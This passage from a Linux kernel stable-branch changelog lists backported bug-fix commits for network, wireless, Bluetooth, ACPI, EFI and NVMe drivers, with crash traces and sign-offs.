Date: Wed Sep 19 18:29:53 2018 +0100
net: hns3: Check hdev state when getting link status
[ Upstream commit 582d37bbb613b8ad86bf82845d3a74a02a5a0fa1 ]
By default, HW link status is up. If hclge\_update\_link\_status is called
before net up, driver will print "link up". It is not suitable. hdev
state check is needed when getting link status.
Fixes: 46a3df9f9718 ("net: hns3: Add HNS3 Acceleration Engine & Compatibility Layer Support")
Fixes: e2cb1dec9779 ("net: hns3: Add HNS3 VF HCL(Hardware Compatibility Layer) Support")
Signed-off-by: Fuyun Liang
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 2234cb983817d1f50445240d1613beb3a94aeeb7
Author: Arend van Spriel
Date: Wed Sep 5 09:48:58 2018 +0200
brcmfmac: fix for proper support of 160MHz bandwidth
[ Upstream commit 330994e8e8ec5d0b269a5265e6032b37e29aa336 ]
Decoding of firmware channel information was not complete for 160MHz
support. This resulted in the following warning:
WARNING: CPU: 2 PID: 2222 at .../broadcom/brcm80211/brcmutil/d11.c:196
brcmu\_d11ac\_decchspec+0x2e/0x100 [brcmutil]
Modules linked in: brcmfmac(O) brcmutil(O) sha256\_generic cfg80211 ...
CPU: 2 PID: 2222 Comm: kworker/2:0 Tainted: G O
4.17.0-wt-testing-x64-00002-gf1bed50 #1
Hardware name: Dell Inc. Latitude E6410/07XJP9, BIOS A07 02/15/2011
Workqueue: events request\_firmware\_work\_func
RIP: 0010:brcmu\_d11ac\_decchspec+0x2e/0x100 [brcmutil]
RSP: 0018:ffffc90000047bd0 EFLAGS: 00010206
RAX: 000000000000e832 RBX: ffff8801146fe910 RCX: ffff8801146fd3c0
RDX: 0000000000002800 RSI: 0000000000000070 RDI: ffffc90000047c30
RBP: ffffc90000047bd0 R08: 0000000000000000 R09: ffffffffa0798c80
R10: ffff88012bca55e0 R11: ffff880110a4ea00 R12: ffff8801146f8000
R13: ffffc90000047c30 R14: ffff8801146fe930 R15: ffff8801138e02e0
FS: 0000000000000000(0000) GS:ffff88012bc80000(0000) knlGS:0000000000000000
CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f18ce8b8070 CR3: 000000000200a003 CR4: 00000000000206e0
Call Trace:
brcmf\_setup\_wiphybands+0x212/0x780 [brcmfmac]
brcmf\_cfg80211\_attach+0xae2/0x11a0 [brcmfmac]
brcmf\_attach+0x1fc/0x4b0 [brcmfmac]
? \_\_kmalloc+0x13c/0x1c0
brcmf\_pcie\_setup+0x99b/0xe00 [brcmfmac]
brcmf\_fw\_request\_done+0x16a/0x1f0 [brcmfmac]
request\_firmware\_work\_func+0x36/0x60
process\_one\_work+0x146/0x350
worker\_thread+0x4a/0x3b0
kthread+0x102/0x140
? process\_one\_work+0x350/0x350
? kthread\_bind+0x20/0x20
ret\_from\_fork+0x35/0x40
Code: 66 90 0f b7 07 55 48 89 e5 89 c2 88 47 02 88 47 03 66 81 e2 00 38
66 81 fa 00 18 74 6e 66 81 fa 00 20 74 39 66 81 fa 00 10 74 14 <0f>
0b 66 25 00 c0 74 20 66 3d 00 c0 75 20 c6 47 04 01 5d c3 66
---[ end trace 550c46682415b26d ]---
brcmfmac: brcmf\_construct\_chaninfo: Ignoring unexpected firmware channel 50
This patch adds the missing stuff to properly handle this.
Reviewed-by: Hante Meuleman
Reviewed-by: Pieter-Paul Giesberts
Reviewed-by: Franky Lin
Signed-off-by: Arend van Spriel
Signed-off-by: Kalle Valo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 1a744358fd4b0f32d3a5d1f0148b128221823b6e
Author: YueHaibing
Date: Thu Sep 20 01:58:18 2018 +0000
pinctrl: qcom: spmi-mpp: Fix err handling of pmic\_mpp\_set\_mux
[ Upstream commit 69f8455f6cc78fa6cdf80d0105d7a748106271dc ]
'ret' should be returned while pmic\_mpp\_write\_mode\_ctl fails.
Fixes: 0e948042c420 ("pinctrl: qcom: spmi-mpp: Implement support for sink mode")
Signed-off-by: YueHaibing
Signed-off-by: Linus Walleij
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit d2a76333ce319d79fa3128f9e16c8f4602653273
Author: YueHaibing
Date: Fri Sep 21 09:59:41 2018 +0800
pinctrl: sunxi: fix 'pctrl->functions' allocation in sunxi\_pinctrl\_build\_state
[ Upstream commit a4925311a5443126ecc90671a1604ea7b0f5b32e ]
fixes following Smatch static check warning:
./drivers/pinctrl/sunxi/pinctrl-sunxi.c:1112 sunxi\_pinctrl\_build\_state()
warn: passing devm\_ allocated variable to kfree. 'pctrl->functions'
As we will be calling krealloc() on pointer 'pctrl->functions', which means
kfree() will be called in there, devm\_kzalloc() shouldn't be used with
the allocation in the first place. Fix the warning by calling kcalloc()
and managing the free procedure in error path on our own.
Fixes: 0e37f88d9ad8 ("ARM: sunxi: Add pinctrl driver for Allwinner SoCs")
Signed-off-by: YueHaibing
Acked-by: Maxime Ripard
Signed-off-by: Linus Walleij
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 918d81fd9bfd99cabdb3ea6b47157bbeb2a5414e
Author: Jian Shen
Date: Fri Sep 21 16:41:37 2018 +0100
net: hns3: Fix ets validate issue
[ Upstream commit adefc0a2ff465f4ac4a88450fe69d336c8b074c5 ]
There is a defect in hclge\_ets\_validate(). If each member of tc\_tsa is
not IEEE\_8021QAZ\_TSA\_ETS, the variable total\_ets\_bw won't be updated.
In this case, the check for value of total\_ets\_bw will fail. This patch
fixes it by checking total\_ets\_bw only after it has been updated.
Fixes: cacde272dd00 ("net: hns3: Add hclge\_dcb module for the support of DCB feature")
Signed-off-by: Jian Shen
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 118f36c16c4f9e50c5d0ae9945119d630ed0232f
Author: Jian Shen
Date: Fri Sep 21 16:41:43 2018 +0100
net: hns3: Add nic state check before calling netif\_tx\_wake\_queue
[ Upstream commit 7a8101109dd37837f587cd56f3111d4fc17a07f5 ]
When nic down, it firstly calls netif\_tx\_stop\_all\_queues(), then calls
napi\_disable(). But napi\_disable() will wait current napi\_poll finish,
it may call netif\_tx\_wake\_queue(). This patch fixes it by add nic state
checking.
Fixes: 424eb834a9be ("net: hns3: Unified HNS3 {VF|PF} Ethernet Driver for hip08 SoC")
Signed-off-by: Jian Shen
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 0e79c6b664a7f192cef5ad46cef7c3d6fe914f40
Author: Ben Hutchings
Date: Sun Sep 16 16:22:47 2018 +0100
x86: boot: Fix EFI stub alignment
[ Upstream commit 9c1442a9d039a1a3302fa93e9a11001c5f23b624 ]
We currently align the end of the compressed image to a multiple of
16. However, the PE-COFF header included in the EFI stub says that
the file alignment is 32 bytes, and when adding an EFI signature to
the file it must first be padded to this alignment.
sbsigntool commands warn about this:
warning: file-aligned section .text extends beyond end of file
warning: checksum areas are greater than image size. Invalid section table?
Worse, pesign -at least when creating a detached signature- uses the
hash of the unpadded file, resulting in an invalid signature if
padding is required.
Avoid both these problems by increasing alignment to 32 bytes when
CONFIG\_EFI\_STUB is enabled.
Signed-off-by: Ben Hutchings
Signed-off-by: Ard Biesheuvel
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 147de8c2ee383d446a50d26d2c7549f073f50405
Author: Hans de Goede
Date: Wed Sep 12 20:32:05 2018 +0200
efi/x86: Call efi\_parse\_options() from efi\_main()
[ Upstream commit c33ce984435bb6142792802d75513a71e55d1969 ]
Before this commit we were only calling efi\_parse\_options() from
make\_boot\_params(), but make\_boot\_params() only gets called if the
kernel gets booted directly as an EFI executable. So when booted through
e.g. grub we ended up not parsing the commandline in the boot code.
This makes the drivers/firmware/efi/libstub code ignore the "quiet"
commandline argument resulting in the following message being printed:
"EFI stub: UEFI Secure Boot is enabled."
Despite the quiet request. This commits adds an extra call to
efi\_parse\_options() to efi\_main() to make sure that the options are
always processed. This fixes quiet not working.
This also fixes the libstub code ignoring nokaslr and efi=nochunk.
Reported-by: Peter Robinson
Signed-off-by: Hans de Goede
Signed-off-by: Ard Biesheuvel
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit ea3207da0bd6f992c04620ec387ae00bb99689ce
Author: Balakrishna Godavarthi
Date: Wed Aug 22 17:50:05 2018 +0530
Bluetooth: hci\_qca: Remove hdev dereference in qca\_close().
[ Upstream commit c2d7827338618a9e73a3f892ca63d9082bb7a94d ]
When flag KASAN is set, we are seeing an following crash while removing
hci\_uart module.
[ 50.589909] Unable to handle kernel paging request at virtual address 6b6b6b6b6b6b73
[ 50.597902] Mem abort info:
[ 50.600846] Exception class = DABT (current EL), IL = 32 bits
[ 50.606959] SET = 0, FnV = 0
[ 50.610142] EA = 0, S1PTW = 0
[ 50.613396] Data abort info:
[ 50.616401] ISV = 0, ISS = 0x00000004
[ 50.620373] CM = 0, WnR = 0
[ 50.623466] [006b6b6b6b6b6b73] address between user and kernel address ranges
[ 50.630818] Internal error: Oops: 96000004 [#1] PREEMPT SMP
[ 50.671670] PC is at qca\_power\_shutdown+0x28/0x100 [hci\_uart]
[ 50.677593] LR is at qca\_close+0x74/0xb0 [hci\_uart]
[ 50.775689] Process rmmod (pid: 2144, stack limit = 0xffffff801ba90000)
[ 50.782493] Call trace:
[ 50.872150] [] qca\_power\_shutdown+0x28/0x100 [hci\_uart]
[ 50.879138] [] qca\_close+0x74/0xb0 [hci\_uart]
[ 50.885238] [] hci\_uart\_unregister\_device+0x44/0x50 [hci\_uart]
[ 50.892846] [] qca\_serdev\_remove+0x50/0x5c [hci\_uart]
[ 50.899654] [] serdev\_drv\_remove+0x28/0x38
[ 50.905489] [] device\_release\_driver\_internal+0x140/0x1e4
[ 50.912653] [] driver\_detach+0x78/0x84
[ 50.918121] [] bus\_remove\_driver+0x80/0xa8
[ 50.923942] [] driver\_unregister+0x4c/0x58
[ 50.929768] [] qca\_deinit+0x24/0x598 [hci\_uart]
[ 50.936045] [] hci\_uart\_exit+0x10/0x48 [hci\_uart]
[ 50.942495] [] SyS\_delete\_module+0x17c/0x224
This crash is due to dereference of hdev, after freeing it.
Signed-off-by: Balakrishna Godavarthi
Signed-off-by: Marcel Holtmann
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 7fb380e23c1baa0e68db550c1d79f6a00fe8deb9
Author: Christian Hewitt
Date: Tue Sep 4 21:50:57 2018 +0400
Bluetooth: btbcm: Add entry for BCM4335C0 UART bluetooth
[ Upstream commit a357ea098c9605f60d92a66a9073f56ce25726da ]
This patch adds the device ID for the AMPAK AP6335 combo module used
in the 1st generation WeTek Hub Android/LibreELEC HTPC box. The WiFI
chip identifies itself as BCM4339, while Bluetooth identifies itself
as BCM4335 (rev C0):
```
[ 4.864248] Bluetooth: hci0: BCM: chip id 86
[ 4.866388] Bluetooth: hci0: BCM: features 0x2f
[ 4.889317] Bluetooth: hci0: BCM4335C0
[ 4.889332] Bluetooth: hci0: BCM4335C0 (003.001.009) build 0000
[ 9.778383] Bluetooth: hci0: BCM4335C0 (003.001.009) build 0268
```
Output from hciconfig:
```
hci0: Type: Primary Bus: UART
BD Address: 43:39:00:00:1F:AC ACL MTU: 1021:8 SCO MTU: 64:1
UP RUNNING
RX bytes:7567 acl:234 sco:0 events:386 errors:0
TX bytes:53844 acl:77 sco:0 commands:304 errors:0
Features: 0xbf 0xfe 0xcf 0xfe 0xdb 0xff 0x7b 0x87
Packet type: DM1 DM3 DM5 DH1 DH3 DH5 HV1 HV2 HV3
Link policy: RSWITCH SNIFF
Link mode: SLAVE ACCEPT
Name: 'HUB'
Class: 0x0c0000
Service Classes: Rendering, Capturing
Device Class: Miscellaneous,
HCI Version: 4.0 (0x6) Revision: 0x10c
LMP Version: 4.0 (0x6) Subversion: 0x6109
Manufacturer: Broadcom Corporation (15)
```
Signed-off-by: Christian Hewitt
Signed-off-by: Marcel Holtmann
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 8f6bfa4c99f1eb70bf453b665cb8fc393ef76948
Author: Yunsheng Lin
Date: Wed Sep 26 19:28:36 2018 +0100
net: hns3: Fix for packet buffer setting bug
[ Upstream commit 996ff91840eb6f288826e472685abde78bac20ea ]
The hardware expects a unit of 128 bytes when setting
packet buffer. When calculating the packet buffer size,
hclge\_rx\_buffer\_calc does not round up the size as a unit
of 128 byte, which may casue packet lost problem when stress
testing.
This patch fixes it by rounding up packet size when calculating.
Fixes: 46a3df9f9718 ("net: hns3: Add HNS3 Acceleration Engine & Compatibility Layer Support")
Signed-off-by: Yunsheng Lin
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit e5014ac93db1b1d375326de6050fd999032856ca
Author: Jacob Keller
Date: Wed Sep 19 17:23:07 2018 -0700
ice: update fw version check logic
[ Upstream commit 396fbf9cab5dc07f8f87773062a8d35f54b40a05 ]
We have MAX\_FW\_API\_VER\_BRANCH, MAX\_FW\_API\_VER\_MAJOR, and
MAX\_FW\_API\_VER\_MINOR that we use in ice\_controlq.h to test when a
firmware version is newer than expected. This is currently tested by
comparing each field separately. Thus, we compare the branch field
against the MAX\_FW\_API\_VER\_BRANCH, and so forth.
This means that currently, if we suppose that the max firmware version
is defined as 0.2.1, i.e.
Then firmware 0.1.3 will fail to load. This is because the minor version
3 is greater than the max minor version 1.
This is not intuitive, because of the notion that increasing the major
firmware version to 2 should mean any firmware version with a major
version is less than 2 should be considered older than 2...
In order to allow both 0.2.1 and 0.1.3 to load, you would have to define
the "max" firmware version as 0.2.3.. It is possible that such
a firmware version doesn't even exist yet!
Fix this by replacing the current logic with an updated check that
behaves as follows:
First, we check the major version. If it is greater than the expected
version, then we prevent driver load. Additionally, a warning message is
logged to indicate to the system administrator that they need to update
their driver. This is now the only case where the driver will refuse to
load.
Second, if the major version is less than the expected version, we log
an information message indicating the NVM should be updated.
Third, if the major version is exact, we'll then check the minor
version. If the minor version is more than two versions less than
expected, we log an information message indicating the NVM should be
updated. If it is more than two versions greater than the expected
version, we log an information message that the driver should be
updated.
To support this, the ice\_aq\_ver\_check function needs its signature
updated to pass the HW structure. Since we now pass this structure,
there is no need to pass the firmware API versions separately.
Signed-off-by: Jacob Keller
Signed-off-by: Anirudh Venkataramanan
Tested-by: Andrew Bowers
Signed-off-by: Jeff Kirsher
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 8863fed18feee80ca086fdbc8dbc5e1d9c2caf68
Author: Bruce Allan
Date: Wed Sep 19 17:23:11 2018 -0700
ice: fix changing of ring descriptor size (ethtool -G)
[ Upstream commit f934bb9b8b6136edd261b2dc2c9ad4dbc39ffc66 ]
rx\_mini\_pending was set to an incorrect value. This was causing EINVAL to
always be returned to 'ethtool -G'. The driver does not support mini or
jumbo rings so the respective settings should be zero.
Also, change the valid range of the number of descriptors in the rings to
make the code simpler and easier for users to understand (this removes the
valid settings of 8 and 16). Add a system log message indicating when the
number is rounded-up from what the user specifies with the 'ethtool -G'
command (i.e. when it is not a multiple of 32), and update the log message
when a user-provided value is out of range to also indicate the stride.
Signed-off-by: Bruce Allan
Signed-off-by: Anirudh Venkataramanan
Tested-by: Andrew Bowers
Signed-off-by: Jeff Kirsher
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 5445a4b0fff2fec55576c3d8445593088a8f70e7
Author: Will Deacon
Date: Wed Sep 5 15:34:42 2018 +0100
signal: Introduce COMPAT\_SIGMINSTKSZ for use in compat\_sys\_sigaltstack
[ Upstream commit 22839869f21ab3850fbbac9b425ccc4c0023926f ]
The sigaltstack(2) system call fails with -ENOMEM if the new alternative
signal stack is found to be smaller than SIGMINSTKSZ. On architectures
such as arm64, where the native value for SIGMINSTKSZ is larger than
the compat value, this can result in an unexpected error being reported
to a compat task. See, for example:
https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=904385
This patch fixes the problem by extending do\_sigaltstack to take the
minimum signal stack size as an additional parameter, allowing the
native and compat system call entry code to pass in their respective
values. COMPAT\_SIGMINSTKSZ is just defined as SIGMINSTKSZ if it has not
been defined by the architecture.
Cc: Arnd Bergmann
Cc: Dominik Brodowski
Cc: "Eric W. Biederman"
Cc: Andrew Morton
Cc: Al Viro
Cc: Oleg Nesterov
Reported-by: Steve McIntyre
Tested-by: Steve McIntyre <93sam@debian.org>
Signed-off-by: Will Deacon
Signed-off-by: Catalin Marinas
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit aea35bd40d64eff19f287b58e5c4a15a305f6607
Author: Rakesh Pillai
Date: Thu Sep 6 18:57:27 2018 +0530
ath10k: fix tx status flag setting for management frames
[ Upstream commit 058a7eab9d9ee12f57282eb0b606668dada70d7a ]
The tx\_status for management frames is being filled
incorrectly in the flags of skb\_cb. This incorrect
flag setting causes the upper layers to consider that
the particular frame was not transmitted properly,
leading to improper behavior.
Set the IEEE80211\_TX\_STAT\_ACK flag in the info flags
of skb\_cb, to indicate the successful transmission of
the management frame.
Tested HW: WCN3990
Tested FW: WLAN.HL.2.0-01188-QCAHLSWMTPLZ-1
Fixes: dc405152bb64d4ae01c9ac669de25b2d1fb6fc2d
Signed-off-by: Rakesh Pillai
Signed-off-by: Kalle Valo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 4b445d47897d97166d2d3063fbe72b496a84dbd0
Author: James Smart
Date: Thu Sep 27 16:58:54 2018 -0700
nvme: call nvme\_complete\_rq when nvmf\_check\_ready fails for mpath I/O
[ Upstream commit 783f4a4408e1251d17f333ad56abac24dde988b9 ]
When an io is rejected by nvmf\_check\_ready() due to validation of the
controller state, the nvmf\_fail\_nonready\_command() will normally return
BLK\_STS\_RESOURCE to requeue and retry. However, if the controller is
dying or the I/O is marked for NVMe multipath, the I/O is failed so that
the controller can terminate or so that the io can be issued on a
different path. Unfortunately, as this reject point is before the
transport has accepted the command, blk-mq ends up completing the I/O
and never calls nvme\_complete\_rq(), which is where multipath may preserve
or re-route the I/O. The end result is, the device user ends up seeing an
EIO error.
Example: single path connectivity, controller is under load, and a reset
is induced. An I/O is received:
a) while the reset state has been set but the queues have yet to be
stopped; or
b) after queues are started (at end of reset) but before the reconnect
has completed.
The I/O finishes with an EIO status.
This patch makes the following changes:
- Adds the HOST\_PATH\_ERROR pathing status from TP4028
- Modifies the reject point such that it appears to queue successfully,
but actually completes the io with the new pathing status and calls
nvme\_complete\_rq().
- nvme\_complete\_rq() recognizes the new status, avoids resetting the
controller (likely was already done in order to get this new status),
and calls the multipather to clear the current path that errored.
This allows the next command (retry or new command) to select a new
path if there is one.
Signed-off-by: James Smart
Reviewed-by: Sagi Grimberg
Signed-off-by: Christoph Hellwig
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit dbf134f69dc577f094ee26015ab06c3fd032ee91
Author: Gustavo A. R. Silva
Date: Tue Sep 18 08:55:55 2018 -0500
mtd: rawnand: atmel: Fix potential NULL pointer dereference
[ Upstream commit fbed20280d912449cfb40c382cb55e3d11502587 ]
There is a potential execution path in which function
of\_find\_compatible\_node() returns NULL. In such a case,
we end up having a NULL pointer dereference when accessing
pointer \*nfc\_np\* in function of\_clk\_get().
So, we better don't take any chances and fix this by null
checking pointer \*nfc\_np\* before calling of\_clk\_get().
Addresses-Coverity-ID: 1473052 ("Dereference null return value")
Fixes: f88fc122cc34 ("mtd: nand: Cleanup/rework the atmel\_nand driver")
Signed-off-by: Gustavo A. R. Silva
Reviewed-by: Boris Brezillon
Acked-by: Tudor Ambarus
Signed-off-by: Miquel Raynal
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit ed8aa1c1f8c0726639013c83dbb75a99256e73b9
Author: Xiaochen Shen
Date: Wed Sep 12 16:48:38 2018 -0700
x86/intel\_rdt: Show missing resctrl mount options
[ Upstream commit 2cc81c6992248ea37d0241bc325977bab310bc3b ]
In resctrl filesystem, mount options exist to enable L3/L2 CDP and MBA
Software Controller features if the platform supports them:
mount -t resctrl resctrl [-o cdp[,cdpl2][,mba\_MBps]] /sys/fs/resctrl
But currently only "cdp" option is displayed in /proc/mounts. "cdpl2" and
"mba\_MBps" options are not shown even when they are active.
Before:
# mount -t resctrl resctrl -o cdp,mba\_MBps /sys/fs/resctrl
# grep resctrl /proc/mounts
/sys/fs/resctrl /sys/fs/resctrl resctrl rw,relatime,cdp 0 0
After:
# mount -t resctrl resctrl -o cdp,mba\_MBps /sys/fs/resctrl
# grep resctrl /proc/mounts
/sys/fs/resctrl /sys/fs/resctrl resctrl rw,relatime,cdp,mba\_MBps 0 0
Signed-off-by: Xiaochen Shen
Signed-off-by: Fenghua Yu
Signed-off-by: Thomas Gleixner
Cc: "H Peter Anvin"
Cc: "Tony Luck"
Link: https://lkml.kernel.org/r/1536796118-60135-1-git-send-email-fenghua.yu@intel.com
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 6d8553dcd9d1e91bebe1e65ad8cbba8ec81d9832
Author: Viresh Kumar
Date: Wed Oct 3 15:35:21 2018 +0530
cpufreq: dt: Try freeing static OPPs only if we have added them
[ Upstream commit 51c99dd2c06b234575661fa1e0a1dea6c3ef566f ]
We can not call dev\_pm\_opp\_of\_cpumask\_remove\_table() freely anymore
since the latest OPP core updates as that uses reference counting to
free resources. There are cases where no static OPPs are added (using
DT) for a platform and trying to remove the OPP table may end up
decrementing refcount which is already zero and hence generating
warnings.
Lets track if we were able to add static OPPs or not and then only
remove the table based on that. Some reshuffling of code is also done to
do that.
Reported-by: Niklas Cassel
Tested-by: Niklas Cassel
Signed-off-by: Viresh Kumar
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 7b7706258e003a6966b9abc3f325e444ad43ea58
Author: Dou Liyang
Date: Fri Aug 24 10:51:26 2018 +0800
ACPI / processor: Fix the return value of acpi\_processor\_ids\_walk()
[ Upstream commit d0381bf4f80c571dde1244fe5b85dc35e8b3f546 ]
ACPI driver should make sure all the processor IDs in their ACPI Namespace
are unique. the driver performs a depth-first walk of the namespace tree
and calls the acpi\_processor\_ids\_walk() to check the duplicate IDs.
But, the acpi\_processor\_ids\_walk() mistakes the return value. If a
processor is checked, it returns true which causes the walk break
immediately, and other processors will never be checked.
Repace the value with AE\_OK which is the standard acpi\_status value.
And don't abort the namespace walk even on error.
Fixes: 8c8cb30f49b8 (acpi/processor: Implement DEVICE operator for processor enumeration)
Signed-off-by: Dou Liyang
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit ec25ba44807bcebd436148cbe246291a9ec32e48
Author: Rajneesh Bhardwaj
Date: Fri Sep 28 14:24:02 2018 +0530
ACPI / PM: LPIT: Register sysfs attributes based on FADT
[ Upstream commit 1cdda9486f5103fb133f88e662e48c504adbb779 ]
ACPI Low Power S0 Idle capabilities are announced via FADT table and can
be used to inform the kernel about the presence of one or more Low Power
Idle (LPI) entries as descried in LPIT table. LPIT table can exist
independently even if the FADT S0 Idle flag is not set and thus it could
confuse user since the following cpuidle attributes are created.
/sys/devices/system/cpu/cpuidle/low\_power\_idle\_cpu\_residency\_us
/sys/devices/system/cpu/cpuidle/low\_power\_idle\_system\_residency\_us
Presence or absence of above attributes could mean that the given
platform supports S0ix state or not.
This change allows to create the above cpuidle attributes only if
FADT table supports Low Power S0 Idle.
Signed-off-by: Rajneesh Bhardwaj
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 0deec59610205886cd9f624117b8198a1f709e0b
Author: Jeffrey Hugo
Date: Thu Oct 4 09:20:06 2018 -0600
ACPI/PPTT: Handle architecturally unknown cache types
[ Upstream commit 59bbff3775c0951300f7b41345a54b999438f8d0 ]
The type of a cache might not be specified by architectural mechanisms (ie
system registers), but its type might be specified in the PPTT. In this
case, we should populate the type of the cache, rather than leave it
undefined.
This fixes the issue where the cacheinfo driver will not populate sysfs
for such caches, resulting in the information missing from utilities like
lstopo and lscpu, thus degrading the user experience.
Fixes: 2bd00bcd73e5 (ACPI/PPTT: Add Processor Properties Topology Table parsing)
Reported-by: Vijaya Kumar K
Signed-off-by: Jeffrey Hugo
Reviewed-by: Sudeep Holla
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit a0a9e3062a0f286355da91ac7e6ed1220b41f0a2
Author: Tony Lindgren
Date: Mon Oct 1 14:38:05 2018 -0700
wlcore: Fix BUG with clear completion on timeout
[ Upstream commit 4e651bad848955d88b29a568bfbfb4b831270e16 ]
We do not currently clear wl->elp\_compl on ELP timeout and we have bogus
lingering pointer that wlcore\_irq then will try to access after recovery
is done:
BUG: spinlock bad magic on CPU#1, irq/255-wl12xx/580
...
(spin\_dump) from [] (do\_raw\_spin\_lock+0xc8/0x124)
(do\_raw\_spin\_lock) from [] (\_raw\_spin\_lock\_irqsave+0x68/0x74)
(\_raw\_spin\_lock\_irqsave) from [] (complete+0x24/0x58)
(complete) from [] (wlcore\_irq+0x48/0x17c [wlcore])
(wlcore\_irq [wlcore]) from [] (irq\_thread\_fn+0x2c/0x64)
(irq\_thread\_fn) from [] (irq\_thread+0x148/0x290)
(irq\_thread) from [] (kthread+0x160/0x17c)
(kthread) from [] (ret\_from\_fork+0x14/0x20)
...
After that the system will hang. Let's fix this by adding a flag for
recovery and moving the recovery work call to to the error handling
section.
And we want to set WL1271\_FLAG\_INTENDED\_FW\_RECOVERY and actually clear
it too in wl1271\_recovery\_work() and just downgrade the error to a
warning to prevent overly verbose output.
Cc: Eyal Reizer
Signed-off-by: Tony Lindgren
Signed-off-by: Kalle Valo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 53785c4db61f0566d0348d1b4d768b7d29c5b1ea
Author: Lubomir Rintel
Date: Thu Oct 4 18:08:08 2018 +0200
x86/olpc: Indicate that legacy PC XO-1 platform should not register RTC
[ Upstream commit d92116b800fb79a72ad26121f5011f6aa3ad94c2 ]
On OLPC XO-1, the RTC is discovered via device tree from the arch
initcall. Don't let the PC platform register another one from its device
initcall, it's not going to work:
sysfs: cannot create duplicate filename '/devices/platform/rtc\_cmos'
CPU: 0 PID: 1 Comm: swapper Not tainted 4.19.0-rc6 #12
Hardware name: OLPC XO/XO, BIOS OLPC Ver 1.00.01 06/11/2014
Call Trace:
dump\_stack+0x16/0x18
sysfs\_warn\_dup+0x46/0x58
sysfs\_create\_dir\_ns+0x76/0x9b
kobject\_add\_internal+0xed/0x209
? \_\_schedule+0x3fa/0x447
kobject\_add+0x5b/0x66
device\_add+0x298/0x535
? insert\_resource\_conflict+0x2a/0x3e
platform\_device\_add+0x14d/0x192
? io\_delay\_init+0x19/0x19
platform\_device\_register+0x1c/0x1f
add\_rtc\_cmos+0x16/0x31
do\_one\_initcall+0x78/0x14a
? do\_early\_param+0x75/0x75
kernel\_init\_freeable+0x152/0x1e0
? rest\_init+0xa2/0xa2
kernel\_init+0x8/0xd5
ret\_from\_fork+0x2e/0x38
kobject\_add\_internal failed for rtc\_cmos with -EEXIST, don't try to
register things with the same name in the same directory.
platform rtc\_cmos: registered platform RTC device (no PNP device found)
Signed-off-by: Lubomir Rintel
Signed-off-by: Borislav Petkov
Acked-by: Thomas Gleixner
CC: "H. Peter Anvin"
CC: Ingo Molnar
CC: x86-ml
Link: http://lkml.kernel.org/r/20181004160808.307738-1-lkundrak@v3.sk
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit a2abae525e2d4c9ff62e15b8da29459e7e23271e
Author: Luca Coelho
Date: Mon Jun 11 11:15:17 2018 +0300
iwlwifi: mvm: check for n\_profiles validity in EWRD ACPI
[ Upstream commit 2e1976bb75263fbad918e82184b16a23bd721546 ]
When reading the profiles from the EWRD table in ACPI, we loop over
the data and set it into our internal table. We use the number of
profiles specified in ACPI without checking its validity, so if the
ACPI table is corrupted and the number is larger than our array size,
we will try to make an out-of-bounds access.
Fix this by making sure the value specified in the ACPI table is
valid.
Fixes: 6996490501ed ("iwlwifi: mvm: add support for EWRD (Dynamic SAR) ACPI table")
Signed-off-by: Luca Coelho
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit b325d5508a901dd4ede320ac2832588544558f83
Author: Emmanuel Grumbach
Date: Wed Jun 13 11:49:20 2018 +0300
iwlwifi: mvm: clear HW\_RESTART\_REQUESTED when stopping the interface
[ Upstream commit 155f7e0441cd121b1e673d465a35e99f4b9b2f0b ]
Fix a bug that happens in the following scenario:
1) suspend without WoWLAN
2) mac80211 calls drv\_stop because of the suspend
3) \_\_iwl\_mvm\_mac\_stop deallocates the aux station
4) during drv\_stop the firmware crashes
5) iwlmvm:
\* sets IWL\_MVM\_STATUS\_HW\_RESTART\_REQUESTED
\* asks mac80211 to kick the restart flow
6) mac80211 puts the restart worker into a freezable
queue which means that the worker will not run for now
since the workqueue is already frozen
7) ...
8) resume
9) mac80211 runs ieee80211\_reconfig as part of the resume
10) mac80211 detects that a restart flow has been requested
and that we are now resuming from suspend and cancels
the restart worker
11) mac80211 calls drv\_start()
12) \_\_iwl\_mvm\_mac\_start checks that IWL\_MVM\_STATUS\_HW\_RESTART\_REQUESTED
clears it, sets IWL\_MVM\_STATUS\_IN\_HW\_RESTART and calls
iwl\_mvm\_restart\_cleanup()
